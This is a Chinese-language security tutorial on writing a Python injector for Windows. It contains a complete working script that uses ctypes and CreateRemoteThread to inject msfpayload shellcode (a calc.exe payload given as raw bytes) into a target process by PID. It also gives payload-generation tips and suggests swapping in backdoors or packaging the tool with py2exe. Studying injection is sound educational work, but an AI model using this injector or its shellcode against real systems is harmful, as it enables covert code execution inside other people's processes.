# Python编写shellcode注入程序

0x00 背景
=======

* * *

本文为《小学生科普系列》的番外篇，本系列面向小学生，纯科普，大牛莫喷~

教程中所有内容仅供学习研究，请勿用于非法用途，否则....我也帮不了你啊...

说起注入，大家第一印象可能还习惯性的停留在sql注入，脚本注入（XSS）等。今天light同(jiao)学(shou)带大家从web端回到操作系统，一起探讨Windows下的经典注入——内存注入，使用python编写一个简单的代码注入程序。

内存注入常见的方法有dll注入和代码注入。Dll注入通俗地讲就是把我们自己的dll注入到目标进程的地址空间内，“寄生”在目标进程里执行。Dll注入需要另外一个“推进器”程序将我们的“寄生虫”dll“注”进目标进程中。

代码注入和dll注入的思路一致，只是“寄生虫”代码与“推进器”代码在同一个程序里面。

Dll文件:windows动态链接库。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。

这次我们的实验选取“代码注入”这一课题。废话不多说，开始动手！

0x01 准备工作
=========

* * *

写python的小程序，light同学推荐性感的Sublime text2 +JEDI（python自动补全插件）。

首先安装sublime text2的“插件管理”插件package control：

打开sublime后，组合键“ctrl+~”调出控制台，将以下代码粘贴进命令行中并回车：

```
import urllib2,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();os.makedirs(ipp) if not os.path.exists(ipp) else None;open(os.path.join(ipp,pf),'wb').write(urllib2.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read())

```

安装完毕后重启sublime text2，输入Ctrl + Shift + P 然后输入Install Package

![enter image description here](http://drops.javaweb.org/uploads/images/880b6fc8e846f242d92e3ebfd88f86b60780f36f.jpg)

然后输入“jedi”，回车安装。

![enter image description here](http://drops.javaweb.org/uploads/images/39282efb90f84555868946858f8d080608ded900.jpg)

磨刀不误砍柴工，装好插件，我们开始正式撸代码。

0x02 烹饪开始
=========

* * *

原料：win7、python27、sublime text2、msfpayload

必备技能：windows api 基础、python基础、metasploit基础（这个还不会的赶快去这里补习！http://zone.wooyun.org/content/17377）

这次的注入代码主要借助了python的ctypes库，这个库使得python可以直接调用windows API，非常方便。“为什么不用c或者c++？”，因为我手头边只有一本《gray hat python》。

```
#-*- coding:utf-8 -*-
#导入sys库以及ctypes库
import sys
from ctypes import *

PAGE_EXECUTE_READWRITE  =  0x00000040
PROCESS_ALL_ACCESS  =  ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM  =  ( 0x1000 | 0x2000 )

kernel32  =  windll.kernel32
pid  =  int(sys.argv[1])

if not sys.argv[1]:
    print "Code Injector: ./code_injector.py <PID to inject>"
    sys.exit(0)

# shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程# 序。生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
shellcode = ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d"
"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
"\x2e\x65\x78\x65\x00")

code_size = len(shellcode)

# 获取我们要注入的进程句柄
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

# 为我们的shellcode申请内存
arg_address = kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

# 在内存中写入shellcode
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

# 创建远程线程，指定入口为我们的shellcode头部
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
    print "[*] Failed to inject shellcode. Exiting."
sys.exit(0)

print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value

```

句柄：句柄与普通指针的区别在于，指针包含的是引用对象的内存地址，而句柄则是由系统所管理的引用标识，该标识可以被系统重新定位到一个内存地址上。这种间接访问对象的模式增强了系统对引用对象的控制。

可以看到，之所以能进行内存注入，主要归功于windows开放的一个关键api：CreateRemoteThread。这个函数允许我们创建一个在其它进程地址空间中运行的线程(也称：创建远程线程)。

而整个注入过程可以划分为三个步骤：获取目标进程句柄，把shellcode写入内存，创建远程线程。这也是内存注入的基本原理和机制。

在使用msfpayload生成shellcode时，有两个坑需要大家注意。

坑一： Msfpayload生成shellcode时，不能使用msfencode，有些资料告诉我们生成shellcode时要在后面加上 msfencode -b ‘\x00’ 来避免空字，但是msfencode一旦使用，默认就会使用 x86/shikata_ga_nai 等编码器对shellcode编码一次。这里light同学推荐大家用 msfpayload xxx C的方式来生成纯净的shellcode。

坑二：

msfpayload windows/exec CMD = calc.exe C　

直接生成的shellcode执行结果是宿主100%崩溃，简直就是进程杀手。我在测试过程中，把用来测试的百度云管家崩的天昏地暗。这个坑花了好久才跳出来。

后来号基友用ollydbg调试发现shellcode退出时直接exit process，把整个进程都结束了。

![enter image description here](http://drops.javaweb.org/uploads/images/7980f9215e5aea73846709d5d523fa5e04ed41f4.jpg)

在基友热心帮助下，再参考msfpayload官方文档后顿悟，果断修改EXITFUNC的值为thread（默认为process）：

![enter image description here](http://drops.javaweb.org/uploads/images/729dcda4b394cef05bb1e8b88b6b2afa97ac5c17.jpg)

测试成功！

![enter image description here](http://drops.javaweb.org/uploads/images/dcaab6e3db9508a19ba27f254b9c3cc68ac49b19.jpg)

最后，我们可以把这个python脚本用py2exe打包成exe可执行文件。有兴趣的话还可以加上UI，做成一个可以定制不同注入类型（dll或代码注入）、注入代码（反向后门或恶作剧程序）的程序。

任何问题或者好的建议请骚扰：root@1ight.co

参考文档：

《gray hat python》

http://www.offensive-security.com/metasploit-unleashed/Msfpayload

http://www.google.com